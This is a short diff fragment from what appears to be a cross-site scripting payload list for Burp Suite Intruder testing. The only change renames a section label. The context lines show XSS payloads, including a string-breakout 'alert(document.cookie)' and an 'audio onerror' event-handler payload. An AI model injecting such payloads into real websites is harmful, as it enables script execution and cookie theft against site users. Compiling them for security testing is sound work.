@@ -67,7 +67,7 @@ foo\’; alert(document.cookie);//’;
 
 <audio src=1 onerror=alert(1)>
 ++++++++++++++++++++++++++++++++++++++++++++++++
-TEST payloads for burpsuite:=                                
+TEST payloads for burpsuite intruder:=                                
 <                                              
 >
 <>
